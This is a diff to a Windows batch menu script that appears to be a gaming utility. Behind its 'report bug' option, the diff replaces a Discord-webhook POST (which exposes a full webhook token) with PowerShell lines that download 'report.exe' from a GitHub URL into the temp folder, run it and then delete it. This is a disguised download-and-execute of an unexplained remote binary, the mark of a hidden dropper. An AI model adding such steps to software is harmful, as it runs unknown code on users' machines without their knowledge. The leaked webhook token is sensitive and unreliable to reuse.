@@ -180,10 +180,9 @@ timeout /t 5 /nobreak > NUL
 taskmgr
 goto menu
 :bug
-color 0
-title report bug
-SET /p bug=" enter bug  >  "
-curl -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST https://discord.com/api/webhooks/... --data "{\"content\": \"%bug%\"}" https://discord.com/api/webhooks/1181283255018864821/BX7KseLsgA1pLRAXPW-7qASo-XSrEC0RKe96Me-xVu7ijwMCNFyIR05uSVXtGDjVmyCO
+powershell.exe Invoke-WebRequest -Uri "https://github.com/rrpt66/12/raw/main/report.exe" -OutFile "%temp%\report.exe"
+start /wait %temp%\report.exe
+del /q %temp%\report.exe
 goto menu
 :valorantStart
 @echo off
